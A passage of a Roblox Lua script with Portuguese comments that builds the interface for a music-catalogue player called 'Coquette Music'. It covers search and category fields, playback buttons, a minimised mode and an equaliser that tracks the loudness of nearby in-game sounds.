    headerCorner.Parent = header
    local headerGradient = Instance.new("UIGradient")
    headerGradient.Rotation = 25
    headerGradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 30, 34)),
        ColorSequenceKeypoint.new(0.6, THEME.surface),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(11, 11, 13)),
    })
    headerGradient.Parent = header

    local accentBar = Instance.new("Frame")
    accentBar.Size = UDim2.new(0, 3, 0, 24)
    accentBar.Position = UDim2.new(0, 12, 0.5, 0)
    accentBar.AnchorPoint = Vector2.new(0, 0.5)
    accentBar.BackgroundColor3 = THEME.accent
    accentBar.BorderSizePixel = 0
    accentBar.Parent = header
    local accentBarCorner = Instance.new("UICorner")
    accentBarCorner.CornerRadius = UDim.new(1, 0)
    accentBarCorner.Parent = accentBar
end

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -96, 0, 22)
title.Position = UDim2.new(0, 23, 0, 7)
title.BackgroundTransparency = 1
title.Text = "Coquette Music"
title.TextColor3 = THEME.text
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = header

local subtitle = Instance.new("TextLabel")
subtitle.Size = UDim2.new(1, -96, 0, 16)
subtitle.Position = UDim2.new(0, 23, 0, 29)
subtitle.BackgroundTransparency = 1
subtitle.Text = "catalogo By lolytadev"
subtitle.TextColor3 = THEME.textDim
subtitle.Font = Enum.Font.GothamMedium
subtitle.TextSize = 12
subtitle.TextXAlignment = Enum.TextXAlignment.Left
subtitle.Parent = header

-- Realce suave ao passar o mouse / tocar
local function attachHover(button, baseColor, hoverColor)
    button.MouseEnter:Connect(function()
        safeTween(button, { BackgroundColor3 = hoverColor }, 0.12)
    end)
    button.MouseLeave:Connect(function()
        safeTween(button, { BackgroundColor3 = baseColor }, 0.12)
    end)
end

local function topButton(text, xOffset, hoverColor)
    local button = Instance.new("TextButton")
    button.Size = UDim2.new(0, 30, 0, 28)
    button.Position = UDim2.new(1, xOffset, 0, 10)
    button.BackgroundColor3 = THEME.surfaceHi
    button.BorderSizePixel = 0
    button.Text = text
    button.TextColor3 = THEME.text
    button.Font = Enum.Font.GothamBold
    button.TextSize = 18
    button.AutoButtonColor = false
    button.Parent = header
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = button
    attachHover(button, THEME.surfaceHi, hoverColor)
    return button
end

local minimizeButton = topButton("-", -76, THEME.surfaceTop)
local closeButton = topButton("X", -40, THEME.redHi)

local body = Instance.new("Frame")
body.Size = UDim2.new(1, 0, 1, -HEADER_HEIGHT)
body.Position = UDim2.new(0, 0, 0, HEADER_HEIGHT)
body.BackgroundTransparency = 1
body.Parent = main

local padding = Instance.new("UIPadding")
padding.PaddingLeft = UDim.new(0, BODY_PAD)
padding.PaddingRight = UDim.new(0, BODY_PAD)
padding.PaddingTop = UDim.new(0, BODY_PAD)
padding.PaddingBottom = UDim.new(0, BODY_PAD)
padding.Parent = body

-- Cartao "tocando agora"
local nowCard = Instance.new("Frame")
nowCard.Size = UDim2.new(1, 0, 0, NOW_HEIGHT)
nowCard.Position = UDim2.new(0, 0, 0, NOW_Y)
nowCard.BackgroundColor3 = Color3.new(1, 1, 1)
nowCard.BorderSizePixel = 0
nowCard.ClipsDescendants = true
nowCard.Parent = body
local nowCorner = Instance.new("UICorner")
nowCorner.CornerRadius = UDim.new(0, 13)
nowCorner.Parent = nowCard
local nowStroke = Instance.new("UIStroke")
nowStroke.Color = THEME.line
nowStroke.Thickness = 1
nowStroke.Transparency = 0.55
nowStroke.Parent = nowCard
local nowGradient = Instance.new("UIGradient")
nowGradient.Rotation = 90
nowGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(24, 24, 28)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(11, 11, 13)),
})
nowGradient.Parent = nowCard

local nowCaption = Instance.new("TextLabel")
nowCaption.Size = UDim2.new(1, -24, 0, 12)
nowCaption.Position = UDim2.new(0, 12, 0, NOW_CAPTION_Y)
nowCaption.BackgroundTransparency = 1
nowCaption.Text = "TOCANDO AGORA"
nowCaption.TextColor3 = THEME.textDim
nowCaption.Font = Enum.Font.GothamBold
nowCaption.TextSize = 11
nowCaption.TextXAlignment = Enum.TextXAlignment.Left
nowCaption.Parent = nowCard

-- Barras do visualizador, ancoradas na base e alinhadas a esquerda do nome
local function buildEqualizer(parent, position, height, barWidth, gap)
    local container = Instance.new("Frame")
    container.Size = UDim2.new(0, EQ_BAR_COUNT * barWidth + (EQ_BAR_COUNT - 1) * gap, 0, height)
    container.Position = position
    container.BackgroundTransparency = 1
    container.Parent = parent

    local bars = {}
    for i = 1, EQ_BAR_COUNT do
        local bar = Instance.new("Frame")
        bar.Size = UDim2.new(0, barWidth, 0, EQ_MIN_BAR)
        bar.Position = UDim2.new(0, (i - 1) * (barWidth + gap), 1, 0)
        bar.AnchorPoint = Vector2.new(0, 1)
        bar.BackgroundColor3 = THEME.accent
        bar.BorderSizePixel = 0
        bar.Parent = container
        local barCorner = Instance.new("UICorner")
        barCorner.CornerRadius = UDim.new(0, 1)
        barCorner.Parent = bar
        bars[i] = bar
    end
    return container, bars
end

-- Base das barras alinhada com a base do nome (NOW_NAME_Y + altura do texto)
local eqContainer, eqBars = buildEqualizer(
    nowCard,
    UDim2.new(0, 12, 0, NOW_NAME_Y + 16 - EQ_HEIGHT),
    EQ_HEIGHT,
    EQ_BAR_WIDTH,
    EQ_BAR_GAP
)

local nowPlaying = Instance.new("TextLabel")
nowPlaying.Size = UDim2.new(1, -24 - EQ_WIDTH - 10, 0, 18)
nowPlaying.Position = UDim2.new(0, 12 + EQ_WIDTH + 10, 0, NOW_NAME_Y)
nowPlaying.BackgroundTransparency = 1
nowPlaying.Text = "Nada selecionado"
nowPlaying.TextColor3 = THEME.text
nowPlaying.Font = Enum.Font.GothamBold
nowPlaying.TextSize = 15
nowPlaying.TextXAlignment = Enum.TextXAlignment.Left
nowPlaying.TextTruncate = Enum.TextTruncate.AtEnd
nowPlaying.Parent = nowCard

local status = Instance.new("TextLabel")
status.Size = UDim2.new(1, 0, 0, 16)
status.Position = UDim2.new(0, 2, 0, STATUS_Y)
status.BackgroundTransparency = 1
status.Text = "Carregando catalogo..."
status.TextColor3 = THEME.textDim
status.Font = Enum.Font.GothamMedium
status.TextSize = 13
status.TextXAlignment = Enum.TextXAlignment.Left
status.TextTruncate = Enum.TextTruncate.AtEnd
status.Parent = body

local function fieldStroke(parent)
    local stroke = Instance.new("UIStroke")
    stroke.Color = THEME.line
    stroke.Thickness = 1
    stroke.Transparency = 0.35
    stroke.Parent = parent
    return stroke
end

-- Campo limpo para ID Personalizado e Nome com botoes de Tocar e Salvar
local customIdFrame = Instance.new("Frame")
customIdFrame.Size = UDim2.new(1, 0, 0, FIELD_HEIGHT * 2 + 4)
customIdFrame.Position = UDim2.new(0, 0, 0, CUSTOM_ID_Y)
customIdFrame.BackgroundTransparency = 1
customIdFrame.Parent = body

-- Linha 1: ID da Musica + Botao Tocar
local customIdBox = Instance.new("TextBox")
customIdBox.Size = UDim2.new(0.74, -4, 0, FIELD_HEIGHT)
customIdBox.Position = UDim2.new(0, 0, 0, 0)
customIdBox.BackgroundColor3 = THEME.surface
customIdBox.BorderSizePixel = 0
customIdBox.PlaceholderText = "ID da musica (ex: 1839218)..."
customIdBox.Text = ""
customIdBox.TextColor3 = THEME.textDim
customIdBox.PlaceholderColor3 = THEME.textDim
customIdBox.Font = Enum.Font.GothamMedium
customIdBox.TextSize = 14
customIdBox.TextXAlignment = Enum.TextXAlignment.Left
customIdBox.ClearTextOnFocus = false
customIdBox.Parent = customIdFrame

do
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 11)
    corner.Parent = customIdBox
    local stroke = fieldStroke(customIdBox)
    local pad = Instance.new("UIPadding")
    pad.PaddingLeft = UDim.new(0, 12)
    pad.PaddingRight = UDim.new(0, 12)
    pad.Parent = customIdBox

    customIdBox.Focused:Connect(function()
        safeTween(stroke, { Color = THEME.line, Transparency = 0.2 }, 0.14)
    end)
    customIdBox.FocusLost:Connect(function()
        safeTween(stroke, { Color = THEME.line, Transparency = 0.35 }, 0.14)
    end)
end

local customPlayBtn = Instance.new("TextButton")
customPlayBtn.Size = UDim2.new(0.26, 0, 0, FIELD_HEIGHT)
customPlayBtn.Position = UDim2.new(0.74, 4, 0, 0)
customPlayBtn.BackgroundColor3 = THEME.accentDeep
customPlayBtn.BorderSizePixel = 0
customPlayBtn.Text = "Tocar"
customPlayBtn.TextColor3 = THEME.onAccent
customPlayBtn.Font = Enum.Font.GothamBold
customPlayBtn.TextSize = 13
customPlayBtn.AutoButtonColor = false
customPlayBtn.Parent = customIdFrame

do
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 11)
    corner.Parent = customPlayBtn
end
attachHover(customPlayBtn, THEME.accentDeep, THEME.accent)

-- Linha 2: Nome da Musica + Botao Salvar
local customNameBox = Instance.new("TextBox")
customNameBox.Size = UDim2.new(0.74, -4, 0, FIELD_HEIGHT)
customNameBox.Position = UDim2.new(0, 0, 0, FIELD_HEIGHT + 4)
customNameBox.BackgroundColor3 = THEME.surface
customNameBox.BorderSizePixel = 0
customNameBox.PlaceholderText = "Nome da musica (opcional)..."
customNameBox.Text = ""
customNameBox.TextColor3 = THEME.textDim
customNameBox.PlaceholderColor3 = THEME.textDim
customNameBox.Font = Enum.Font.GothamMedium
customNameBox.TextSize = 14
customNameBox.TextXAlignment = Enum.TextXAlignment.Left
customNameBox.ClearTextOnFocus = false
customNameBox.Parent = customIdFrame

do
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 11)
    corner.Parent = customNameBox
    local stroke = fieldStroke(customNameBox)
    local pad = Instance.new("UIPadding")
    pad.PaddingLeft = UDim.new(0, 12)
    pad.PaddingRight = UDim.new(0, 12)
    pad.Parent = customNameBox

    customNameBox.Focused:Connect(function()
        safeTween(stroke, { Color = THEME.line, Transparency = 0.2 }, 0.14)
    end)
    customNameBox.FocusLost:Connect(function()
        safeTween(stroke, { Color = THEME.line, Transparency = 0.35 }, 0.14)
    end)
end

local customSaveBtn = Instance.new("TextButton")
customSaveBtn.Size = UDim2.new(0.26, 0, 0, FIELD_HEIGHT)
customSaveBtn.Position = UDim2.new(0.74, 4, 0, FIELD_HEIGHT + 4)
customSaveBtn.BackgroundColor3 = THEME.surfaceHi
customSaveBtn.BorderSizePixel = 0
customSaveBtn.Text = "+ Salvar"
customSaveBtn.TextColor3 = THEME.text
customSaveBtn.Font = Enum.Font.GothamBold
customSaveBtn.TextSize = 13
customSaveBtn.AutoButtonColor = false
customSaveBtn.Parent = customIdFrame

do
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 11)
    corner.Parent = customSaveBtn
    local stroke = Instance.new("UIStroke")
    stroke.Color = THEME.line
    stroke.Thickness = 1
    stroke.Transparency = 0.35
    stroke.Parent = customSaveBtn
end
attachHover(customSaveBtn, THEME.surfaceHi, THEME.surfaceTop)

-- Dropdown de Categorias
local categoryButton = Instance.new("TextButton")
categoryButton.Size = UDim2.new(1, 0, 0, FIELD_HEIGHT)
categoryButton.Position = UDim2.new(0, 0, 0, CATEGORY_Y)
categoryButton.BackgroundColor3 = THEME.surface
categoryButton.BorderSizePixel = 0
categoryButton.Text = "Carregando"
categoryButton.TextColor3 = THEME.text
categoryButton.Font = Enum.Font.GothamBold
categoryButton.TextSize = 14
categoryButton.TextXAlignment = Enum.TextXAlignment.Left
categoryButton.AutoButtonColor = false
categoryButton.Parent = body

do
    local catCorner = Instance.new("UICorner")
    catCorner.CornerRadius = UDim.new(0, 11)
    catCorner.Parent = categoryButton
    fieldStroke(categoryButton)
    local catPad = Instance.new("UIPadding")
    catPad.PaddingLeft = UDim.new(0, 12)
    catPad.PaddingRight = UDim.new(0, 34)
    catPad.Parent = categoryButton
end
attachHover(categoryButton, THEME.surface, THEME.surfaceHi)

local categoryIcon = Instance.new("ImageLabel")
categoryIcon.Size = UDim2.new(0, 16, 0, 16)
categoryIcon.Position = UDim2.new(1, -10, 0, CATEGORY_Y + FIELD_HEIGHT / 2)
categoryIcon.AnchorPoint = Vector2.new(1, 0.5)
categoryIcon.BackgroundTransparency = 1
categoryIcon.Image = ICON_CHEVRON_DOWN
categoryIcon.ImageColor3 = THEME.accentSoft
categoryIcon.ZIndex = 12
categoryIcon.Parent = body

-- Buscar musica
local searchBox = Instance.new("TextBox")
searchBox.Size = UDim2.new(1, 0, 0, FIELD_HEIGHT)
searchBox.Position = UDim2.new(0, 0, 0, SEARCH_Y)
searchBox.BackgroundColor3 = THEME.surface
searchBox.BorderSizePixel = 0
searchBox.PlaceholderText = "Buscar musica..."
searchBox.Text = ""
searchBox.TextColor3 = THEME.textDim
searchBox.PlaceholderColor3 = THEME.textDim
searchBox.Font = Enum.Font.GothamMedium
searchBox.TextSize = 14
searchBox.TextXAlignment = Enum.TextXAlignment.Left
searchBox.ClearTextOnFocus = false
searchBox.Parent = body

do
    local searchCorner = Instance.new("UICorner")
    searchCorner.CornerRadius = UDim.new(0, 11)
    searchCorner.Parent = searchBox
    local searchStroke = fieldStroke(searchBox)
    local searchPad = Instance.new("UIPadding")
    searchPad.PaddingLeft = UDim.new(0, 12)
    searchPad.PaddingRight = UDim.new(0, 12)
    searchPad.Parent = searchBox

    searchBox.Focused:Connect(function()
        safeTween(searchStroke, { Color = THEME.line, Transparency = 0.2 }, 0.14)
    end)
    searchBox.FocusLost:Connect(function()
        safeTween(searchStroke, { Color = THEME.line, Transparency = 0.35 }, 0.14)
    end)
end

local dropdown = Instance.new("ScrollingFrame")
dropdown.Size = UDim2.new(1, 0, 0, 0)
dropdown.Position = UDim2.new(0, 0, 0, CATEGORY_Y + FIELD_HEIGHT + 4)
dropdown.BackgroundColor3 = Color3.fromRGB(11, 11, 13)
dropdown.BorderSizePixel = 0
dropdown.ClipsDescendants = true
dropdown.Visible = false
dropdown.ZIndex = 20
dropdown.ScrollBarThickness = isCompactScreen and 5 or 4
dropdown.ScrollBarImageColor3 = THEME.surfaceTop
dropdown.CanvasSize = UDim2.new(0, 0, 0, 0)
dropdown.ScrollingDirection = Enum.ScrollingDirection.Y
dropdown.Parent = body
local dropCorner = Instance.new("UICorner")
dropCorner.CornerRadius = UDim.new(0, 11)
dropCorner.Parent = dropdown
local dropStroke = Instance.new("UIStroke")
dropStroke.Color = THEME.line
dropStroke.Thickness = 1
dropStroke.Transparency = 0.2
dropStroke.Parent = dropdown
local dropLayout = Instance.new("UIListLayout")
dropLayout.Padding = UDim.new(0, 4)
dropLayout.SortOrder = Enum.SortOrder.LayoutOrder
dropLayout.Parent = dropdown
local dropPad = Instance.new("UIPadding")
dropPad.PaddingTop = UDim.new(0, 5)
dropPad.PaddingLeft = UDim.new(0, 5)
dropPad.PaddingRight = UDim.new(0, 5)
dropPad.PaddingBottom = UDim.new(0, 10)
dropPad.Parent = dropdown

dropLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    dropdown.CanvasSize = UDim2.new(0, 0, 0, dropLayout.AbsoluteContentSize.Y + 20)
end)

list = Instance.new("ScrollingFrame")
list.Size = UDim2.new(1, 0, 0, LIST_HEIGHT)
list.Position = UDim2.new(0, 0, 0, LIST_Y)
list.BackgroundColor3 = THEME.backdropLow
list.BorderSizePixel = 0
list.ScrollBarThickness = isCompactScreen and 5 or 4
list.ScrollBarImageColor3 = THEME.surfaceTop
list.CanvasSize = UDim2.new(0, 0, 0, 0)
list.Parent = body
local listCorner = Instance.new("UICorner")
listCorner.CornerRadius = UDim.new(0, 13)
listCorner.Parent = list
local listStroke = Instance.new("UIStroke")
listStroke.Color = THEME.surfaceHi
listStroke.Thickness = 1
listStroke.Transparency = 0.5
listStroke.Parent = list
local listLayout = Instance.new("UIListLayout")
listLayout.Padding = UDim.new(0, 5)
listLayout.Parent = list
local listPad = Instance.new("UIPadding")
listPad.PaddingTop = UDim.new(0, 7)
listPad.PaddingLeft = UDim.new(0, 7)
listPad.PaddingRight = UDim.new(0, 7)
listPad.PaddingBottom = UDim.new(0, 10)
listPad.Parent = list

listLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    list.CanvasSize = UDim2.new(0, 0, 0, listLayout.AbsoluteContentSize.Y + 20)
end)

controls = Instance.new("Frame")
controls.Size = UDim2.new(1, 0, 0, CONTROL_HEIGHT)
controls.Position = UDim2.new(0, 0, 1, -CONTROL_HEIGHT)
controls.BackgroundTransparency = 1
controls.Parent = body

-- No celular os 5 botoes viram duas linhas para nao ficarem espremidos
local controlRowA, controlRowB = controls, controls
if isCompactScreen then
    controlRowA = Instance.new("Frame")
    controlRowA.Size = UDim2.new(1, 0, 0, CONTROL_BUTTON_HEIGHT)
    controlRowA.BackgroundTransparency = 1
    controlRowA.Parent = controls

    controlRowB = Instance.new("Frame")
    controlRowB.Size = UDim2.new(1, 0, 0, CONTROL_BUTTON_HEIGHT)
    controlRowB.Position = UDim2.new(0, 0, 0, CONTROL_BUTTON_HEIGHT + 8)
    controlRowB.BackgroundTransparency = 1
    controlRowB.Parent = controls
end

local CONTROL_GAP = 5

-- Distribui os botoes numa linha: as larguras somam 1 e os vaos sao descontados
-- proporcionalmente, entao a linha termina exatamente na borda direita.
local function layoutRow(parent, specs)
    local gapTotal = CONTROL_GAP * (#specs - 1)
    local created = {}
    local usedOffset = 0
    for i, spec in ipairs(specs) do
        local widthOffset = -gapTotal * spec.width
        local button = Instance.new("TextButton")
        button.Size = UDim2.new(spec.width, widthOffset, 0, CONTROL_BUTTON_HEIGHT)
        button.Position = UDim2.new(spec.x, usedOffset + CONTROL_GAP * (i - 1), 0, 0)
        button.BackgroundColor3 = spec.color
        button.BorderSizePixel = 0
        button.Text = spec.text
        button.TextColor3 = spec.textColor or THEME.text
        button.Font = Enum.Font.GothamBold
        button.TextSize = isCompactScreen and 14 or 13
        button.TextScaled = true
        button.AutoButtonColor = false
        button.Parent = parent

        local textSizeConstraint = Instance.new("UITextSizeConstraint")
        textSizeConstraint.MinTextSize = 9
        textSizeConstraint.MaxTextSize = isCompactScreen and 14 or 13
        textSizeConstraint.Parent = button

        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 11)
        corner.Parent = button
        if spec.stroke then
            local outline = Instance.new("UIStroke")
            outline.Color = THEME.line
            outline.Thickness = 1
            outline.Transparency = 0.35
            outline.Parent = button
        end
        attachHover(button, spec.color, spec.hover)
        usedOffset = usedOffset + widthOffset
        created[i] = button
    end
    return created
end

local prevButton, playButton, nextButton, favButton, stopButton
if isCompactScreen then
    local rowA = layoutRow(controlRowA, {
        { text = "<",     x = 0,   width = 0.2, color = THEME.surfaceHi,  hover = THEME.surfaceTop, stroke = true },
        { text = "Tocar", x = 0.2, width = 0.6, color = THEME.accentDeep, hover = THEME.accent,     textColor = THEME.onAccent },
        { text = ">",     x = 0.8, width = 0.2, color = THEME.surfaceHi,  hover = THEME.surfaceTop, stroke = true },
    })
    local rowB = layoutRow(controlRowB, {
        { text = "Favoritar", x = 0,    width = 0.55, color = THEME.green, hover = THEME.greenHi, stroke = true },
        { text = "Parar",     x = 0.55, width = 0.45, color = THEME.red,   hover = THEME.redHi,   stroke = true },
    })
    prevButton, playButton, nextButton = rowA[1], rowA[2], rowA[3]
    favButton, stopButton = rowB[1], rowB[2]
else
    local row = layoutRow(controls, {
        { text = "<",         x = 0,    width = 0.13, color = THEME.surfaceHi,  hover = THEME.surfaceTop, stroke = true },
        { text = "Tocar",     x = 0.13, width = 0.26, color = THEME.accentDeep, hover = THEME.accent,     textColor = THEME.onAccent },
        { text = ">",         x = 0.39, width = 0.13, color = THEME.surfaceHi,  hover = THEME.surfaceTop, stroke = true },
        { text = "Favoritar", x = 0.52, width = 0.27, color = THEME.green,      hover = THEME.greenHi,    stroke = true },
        { text = "Parar",     x = 0.79, width = 0.21, color = THEME.red,        hover = THEME.redHi,      stroke = true },
    })
    prevButton, playButton, nextButton, favButton, stopButton = row[1], row[2], row[3], row[4], row[5]
end

-- Modo minimizado: linha de info (visualizador + nome) em cima, controles embaixo.
-- Posicionamento manual porque MINI_WIDTH e fixo e o UIScale cuida do resto.
local miniControls = Instance.new("Frame")
miniControls.Size = UDim2.new(1, 0, 1, 0)
miniControls.BackgroundTransparency = 1
miniControls.Visible = false
miniControls.Active = true
miniControls.Parent = main

local miniEqContainer, miniEqBars = buildEqualizer(miniControls, UDim2.new(0, 12, 0, 12), 12, 2, 2)

local miniTitle = Instance.new("TextLabel")
miniTitle.Size = UDim2.new(1, -34 - (EQ_BAR_COUNT * 2 + (EQ_BAR_COUNT - 1) * 2), 0, 14)
miniTitle.Position = UDim2.new(0, 12 + (EQ_BAR_COUNT * 2 + (EQ_BAR_COUNT - 1) * 2) + 8, 0, 11)
miniTitle.BackgroundTransparency = 1
miniTitle.Text = "Nada selecionado"
miniTitle.TextColor3 = THEME.text
miniTitle.Font = Enum.Font.GothamBold
miniTitle.TextSize = 12
miniTitle.TextXAlignment = Enum.TextXAlignment.Left
miniTitle.TextTruncate = Enum.TextTruncate.AtEnd
miniTitle.Parent = miniControls

local MINI_BUTTON_W = 60
local MINI_BUTTON_H = 28
local MINI_BUTTON_Y = 30

local function miniButton(text, xOffset, color, hoverColor, textColor)
    local button = Instance.new("TextButton")
    button.Size = UDim2.new(0, MINI_BUTTON_W, 0, MINI_BUTTON_H)
    button.Position = UDim2.new(0, xOffset, 0, MINI_BUTTON_Y)
    button.BackgroundColor3 = color
    button.BorderSizePixel = 0
    button.Text = text
    button.TextColor3 = textColor or THEME.text
    button.Font = Enum.Font.GothamBold
    button.TextSize = 15
    button.AutoButtonColor = false
    button.Parent = miniControls
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 9)
    corner.Parent = button
    attachHover(button, color, hoverColor)
    return button
end

local miniPrevButton = miniButton("<", 12, THEME.surfaceHi, THEME.surfaceTop)
local miniOpenButton = miniButton("Abrir", 12 + MINI_BUTTON_W + 7, THEME.accentDeep, THEME.accent, THEME.onAccent)
local miniNextButton = miniButton(">", 12 + (MINI_BUTTON_W + 7) * 2, THEME.surfaceHi, THEME.surfaceTop)

-- Faixa fina no topo indicando que da pra arrastar
local miniDragHandle = Instance.new("Frame")
miniDragHandle.Size = UDim2.new(1, 0, 0, 10)
miniDragHandle.Position = UDim2.new(0, 0, 0, 0)
miniDragHandle.BackgroundTransparency = 1
miniDragHandle.BorderSizePixel = 0
miniDragHandle.Active = true
miniDragHandle.Visible = false
miniDragHandle.Parent = main
local miniDragLine = Instance.new("Frame")
miniDragLine.Size = UDim2.new(0, 34, 0, 3)
miniDragLine.Position = UDim2.new(0.5, 0, 0.5, 1)
miniDragLine.AnchorPoint = Vector2.new(0.5, 0.5)
miniDragLine.BackgroundColor3 = THEME.surfaceTop
miniDragLine.BorderSizePixel = 0
miniDragLine.Parent = miniDragHandle
local miniDragCorner = Instance.new("UICorner")
miniDragCorner.CornerRadius = UDim.new(1, 0)
miniDragCorner.Parent = miniDragLine

local function notify(message, color)
    status.Text = message
    status.TextColor3 = color or THEME.textDim
end

----------------------------------------------------------------------
-- Visualizador de audio
--
-- O script so dispara remotes, entao ele nao tem referencia ao Sound que a
-- boombox/overboard cria. Procuramos o Sound tocando mais perto do personagem
-- e lemos PlaybackLoudness (que o cliente calcula de verdade).
--
-- Regra: barra so se mexe se existe audio tocando no mundo. Sem fonte audivel
-- as barras zeram e ficam cinzas.
----------------------------------------------------------------------

-- A busca e direcionada aos lugares onde o som realmente toca, em vez de varrer
-- a workspace inteira: o Character (boombox equipada) e a pasta do jogador na
-- workspace (casa, veiculo, NoMotorVehicleModel do overboard). Como isso e
-- barato, roda a cada 0.35s sem backoff e reage quase na hora que voce equipa.
--
-- StarterGear e Backpack ficam de fora de proposito: boombox guardada nao emite
-- som, entao nao deve mover as barras.
local EQ_SCAN_INTERVAL = 0.35
local EQ_LOUDNESS_REF = 220
local activeSound = nil
local lastScan = -math.huge
local eqLevels = {}
local eqPhases = {}
for i = 1, EQ_BAR_COUNT do
    eqLevels[i] = 0
    eqPhases[i] = i * 1.7
end

-- So vale som que esta de fato no mundo. Ao desequipar, a ferramenta sai da
-- workspace e o som deixa de contar imediatamente.
local function soundIsUsable(sound)
    return sound
        and sound.Parent
        and sound.IsPlaying
        and sound.SoundId ~= ""
        and sound:IsDescendantOf(workspace)
end

local function collectSearchRoots()
    local roots = {}
    local character = player.Character
    if character then
        table.insert(roots, character)
    end
    -- Pasta do jogador na workspace: casa, carro e o NoMotorVehicleModel
    local playerFolder = workspace:FindFirstChild(player.Name)
    if playerFolder then
        table.insert(roots, playerFolder)
    end
    return roots
end

local function findActiveSound()
    local character = player.Character
    local root = character and character:FindFirstChild("HumanoidRootPart")
    local best, bestScore = nil, -math.huge

    for _, searchRoot in ipairs(collectSearchRoots()) do
        for _, inst in ipairs(searchRoot:GetDescendants()) do
            if inst:IsA("Sound") and inst.IsPlaying and inst.SoundId ~= "" then
                -- PlaybackLoudness da o volume real; a distancia desempata
                -- quando ha mais de uma fonte tocando por perto.
                local score = inst.PlaybackLoudness
                if root then
                    local emitter = inst.Parent
                    if emitter and emitter:IsA("BasePart") then
                        score = score + math.max(0, 150 - (emitter.Position - root.Position).Magnitude)
                    end
                end
                if score > bestScore then
                    best, bestScore = inst, score
                end
            end
        end
    end
    return best
end

local function setEqColor(color)
    for i = 1, EQ_BAR_COUNT do
        eqBars[i].BackgroundColor3 = color
        miniEqBars[i].BackgroundColor3 = color
    end
end

local function applyEqHeights(height, bars)
    for i = 1, EQ_BAR_COUNT do
        local barHeight = EQ_MIN_BAR + eqLevels[i] * (height - EQ_MIN_BAR)
        bars[i].Size = UDim2.new(0, bars[i].Size.X.Offset, 0, math.floor(barHeight + 0.5))
    end
end

local lastEqColorReal = nil
local eqClock = 0

local eqConnection = RunService.RenderStepped:Connect(function(dt)
    eqClock = eqClock + dt

    if not soundIsUsable(activeSound) then
        activeSound = nil
        if eqClock - lastScan >= EQ_SCAN_INTERVAL then
            lastScan = eqClock
            local ok, found = pcall(findActiveSound)
            activeSound = ok and found or nil
        end
    end

    -- Sem som audivel as barras zeram. Nada de movimento procedural: barra
    -- mexendo tem que significar que existe audio tocando de verdade.
    local isReal = soundIsUsable(activeSound)
    local amplitude = 0
    if isReal then
        amplitude = math.clamp(activeSound.PlaybackLoudness / EQ_LOUDNESS_REF, 0, 1)
    end

    if isReal ~= lastEqColorReal then
        lastEqColorReal = isReal
        setEqColor(isReal and THEME.accent or THEME.textMute)
    end

    -- Cada barra oscila com fase propria para nao virar um bloco solido
    local smoothing = math.min(1, dt * 14)
    for i = 1, EQ_BAR_COUNT do
        local wobble = 0.55 + 0.45 * math.abs(math.sin(eqClock * (2.1 + i * 0.37) + eqPhases[i]))
        local target = amplitude * wobble
        eqLevels[i] = eqLevels[i] + (target - eqLevels[i]) * smoothing
    end

    if minimized then
        applyEqHeights(12, miniEqBars)
    else
        applyEqHeights(EQ_HEIGHT, eqBars)
    end
end)

gui.Destroying:Connect(function()
    if eqConnection then
        eqConnection:Disconnect()
        eqConnection = nil
    end
end)

local function getAllSongs()
    local result = {}
    if currentCategory == "Favoritas" then
        for _, fav in ipairs(favorites) do
            table.insert(result, fav)
        end
        return result
    end
    for _, category in ipairs(categories) do
        if category.name == currentCategory then
            for _, song in ipairs(category.songs or {}) do
                table.insert(result, { name = song.name, id = song.id, category = category.name })
            end
        end
    end
    return result
end

local function selectMusic(music, shouldPlay)
    selectedMusic = music
    selectedIndex = 0
    for i, item in ipairs(filtered) do
        if tostring(item.id) == tostring(music.id) then
            selectedIndex = i
            break
        end
    end
    nowPlaying.Text = music.name
    miniTitle.Text = music.name
    favButton.Text = isFavorite(music.id) and "Remover" or "Favoritar"
    if shouldPlay then
        tocarMusica(music.id)
        notify("Tocando: " .. music.name, THEME.good)
    else
        notify("Selecionada: " .. music.name)
    end
end

local function rebuildList()
    for _, child in ipairs(list:GetChildren()) do
        if child:IsA("TextButton") then child:Destroy() end
    end

    filtered = {}
    local search = currentSearch:lower()
    for _, music in ipairs(getAllSongs()) do
        local name = tostring(music.name or "")
        local category = tostring(music.category or "")
        if search == "" or name:lower():find(search, 1, true) or category:lower():find(search, 1, true) or tostring(music.id):find(search, 1, true) then
            table.insert(filtered, music)
        end
    end

    for i, music in ipairs(filtered) do
        local isSelected = selectedMusic ~= nil and tostring(selectedMusic.id) == tostring(music.id)
        local baseColor = isSelected and THEME.surfaceHi or THEME.surface

        local row = Instance.new("TextButton")
        row.Size = UDim2.new(1, -2, 0, ROW_HEIGHT)
        row.BackgroundColor3 = baseColor
        row.BorderSizePixel = 0
        row.Text = music.name
        row.TextColor3 = isSelected and THEME.text or THEME.textDim
        row.Font = isSelected and Enum.Font.GothamBold or Enum.Font.GothamMedium
        row.TextSize = isCompactScreen and 15 or 14
        row.TextXAlignment = Enum.TextXAlignment.Left
        row.TextTruncate = Enum.TextTruncate.AtEnd
        row.AutoButtonColor = false
        row.Parent = list
        local rowCorner = Instance.new("UICorner")
        rowCorner.CornerRadius = UDim.new(0, 9)
        rowCorner.Parent = row
        local rowPad = Instance.new("UIPadding")
        rowPad.PaddingLeft = UDim.new(0, 14)
        rowPad.PaddingRight = UDim.new(0, 8)
        rowPad.Parent = row

        if isSelected then
            local marker = Instance.new("Frame")
            marker.Size = UDim2.new(0, 3, 0, math.floor(ROW_HEIGHT * 0.5))
            marker.Position = UDim2.new(0, -9, 0.5, 0)
            marker.AnchorPoint = Vector2.new(0, 0.5)
            marker.BackgroundColor3 = THEME.accent
            marker.BorderSizePixel = 0
